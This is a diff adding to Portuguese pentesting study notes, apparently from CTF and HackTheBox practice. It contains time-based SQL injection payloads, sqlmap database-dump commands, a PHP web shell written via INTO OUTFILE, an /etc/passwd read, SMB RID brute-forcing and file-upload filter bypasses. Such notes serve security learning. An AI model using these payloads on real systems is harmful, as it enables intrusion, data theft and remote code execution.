@@ -4,6 +4,24 @@
 
 # http (80)
 - http 1.1 requer Host no header
+
+**parâmetros HTTP**
+```
+GET / HTTP/1.1
+Host: mercury.picoctf.net:46199
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+User-Agent: PicoBrowser (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.112 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: mercury.picoctf.net:46199
+Date: Tue, 26 Feb 2018 14:30:00 GMT
+DNT: 0 # DNT (0 = trackeia o request, 1 = não trackeia o request)
+X-Forwarded-For: 102.177.146.1 # sweeden IP
+Accept-Language: sv # sweedish
+Content-Length: 0
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+```
 ## aspx
 
 enumerando versão do aspx
@@ -200,7 +218,7 @@ stat
 	Descrição: Mostra informações detalhadas sobre um arquivo ou diretório.
 exit ou quit
 
-## via windows
+## Host windows
 **ex nbtstat**
 serve para identificar informações do host
 ```
@@ -1151,20 +1169,20 @@ S-1-5-21-XXXXXXXXX-XXXXXXXXX-XXXXXXXXX-RID
 - `21-XXXXXXXXX-XXXXXXXXX-XXXXXXXXX`: Porção única associada ao domínio ou computador. É chamado de **SID base**.
 - RID: Identificador específico que diferencia contas, grupos ou outros objetos dentro do mesmo domínio ou sistema.
 
-
-Um **SID** típico segue o formato:
-
-|**RID**|**Descrição**|
-|---|---|
-|**500**|Administrador|
-|**501**|Convidado|
-|**512**|Grupo Administradores do Domínio|
-|**513**|Grupo Usuários do Domínio|
-|**1000+**|Contas de usuários criadas manualmente|
-bruteforce de RID
+bruteforce de RID (requer algum usuario validado
 ```
-crackmapexec smb 10.10.11.35 -u guest -p '' -d cicada.htb --shares --rid-brute
+crackmapexec smb 10.10.11.35 -u [USER] -p '' -d cicada.htb --shares --rid-brute
+
+nxc smb 10.10.11.35 -u [USER] -p '' -d cicada.htb --shares --rid-brute
 ```
+
+| **RID**   | **Descrição**                          |
+| --------- | -------------------------------------- |
+| **500**   | Administrador                          |
+| **501**   | Convidado                              |
+| **512**   | Grupo Administradores do Domínio       |
+| **513**   | Grupo Usuários do Domínio              |
+| **1000+** | Contas de usuários criadas manualmente |
 
 
 # low level
@@ -1485,8 +1503,65 @@ verifica se a primeira letra do nome da base de dados é `d`
 ' and ascii(substring(database(),INDEX,1)) == 100 #
 ```
 
-#### sqlmap
+**exemplos de payloads (decodados)**
 ```
+# Exemplo 1
+## exemplo generico
+GET /produtos.php?mprod=0&cat==26 AND (SELECT [QUALQUER_NUMERO] FROM (SELECT(SLEEP(3)))[QUALQUER_STRING])&subcat=161&pag=3 HTTP/1.1
+
+## exemplo particular
+GET /produtos.php?mprod=0&cat==26 AND (SELECT 111111111111111234 FROM (SELECT(SLEEP(3)))string_qualquer_aqui)&subcat=161&pag=3 HTTP/1.1
+
+## exemplo local
+SELECT 11111111111111118818 FROM (SELECT(SLEEP(3)))string_qualquer_aqui;
+
+
+
+
+
+
+```
+obs: No exemplo 1, apenas o parametro `cat` era vulnerável à sql injection
+#### sqlmap
+**descobrindo sql injection**
+```
+sqlmap -u "[URL]"
+
+# exemplo
+sqlmap -u "http://172.16.1.245/produtos.php?mprod=0&cat=26&subcat=161&pag=3" 
+```
+
+**Retrieve de informações**
+```
+# (queremos descobrir as bases de dados) enumeração das bases de dados
+sqlmap -u "http://172.16.1.245/produtos.php?mprod=0&cat=26&subcat=161&pag=3" --dbs
+
+# dump do banco de dados
+sqlmap -u "http://172.16.1.245/produtos.php?mprod=0&cat=26&subcat=161&pag=3" -D deckstore --dump --batch
+```
+
+flags relevantes
+```
+-D [DB]  # DBMS database to enumerate
+
+-T [TBL] # DBMS database table(s) to enumerate
+
+-C [COL] # DBMS database table column(s) to enumerate
+
+```
+
+#### SQL -> RCE
+falta fazer
+```
+# escreve um payload em php e salva no diretório especificado
+SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php';
+
+# leitura de arquivo
+SELECT LOAD_FILE('/etc/passwd');
+
+
+
+
 ```
 
 ## ferramentas de fuzzing
@@ -1659,7 +1734,7 @@ captura o cookie de quem acessou a página com stored XSS e envia para o nosso s
 
 commix
 ```
-commix --url URL --data="site=URL"
+commix --url URL --data="site=[URL]"
 ```
 
 ## upload image
@@ -1932,8 +2007,12 @@ programa transforma binário em hexadecimal
 
 
 ### falsificação de assinatura
-Quando o servidor não possui utilitários para envio de arquivos, mas há possibilidade de fazermos upload de arquivos por uma aplicação web, podemos falsificar a assinatura do arquivo suportado, pdf por exemplo, e enviarmos o nosso payload.
+- Quando o servidor não possui utilitários para envio de arquivos, mas há possibilidade de fazermos upload de arquivos por uma aplicação web, podemos falsificar a assinatura do arquivo suportado, pdf por exemplo, e enviarmos o nosso payload.
 
+https://sagarsajeev.medium.com/file-upload-bypass-to-rce-76991b47ad8f
+- Renamed the payload from : ‘payload.php’ to ‘payload.php\x00.png’ Appending \x00.png to the end bypassed the restriction(Null Byte). 
+	- I also found out that backend filters and removes certain keywords. For example, it removes the term ‘.php’. So we can rename a file as ‘payload.p.phphp’. So when the filter removes ‘.php’ , the file name would become ‘payload.php’. Since the firewall has been bypassed at this stage, script will be executed. One of [John Hammonds video](https://www.youtube.com/c/JohnHammond010) helped me with this.
+- 
 ### tunneling (linux)
 O tunelamento permite um atacante acessar serviços locais da máquina alvo
 
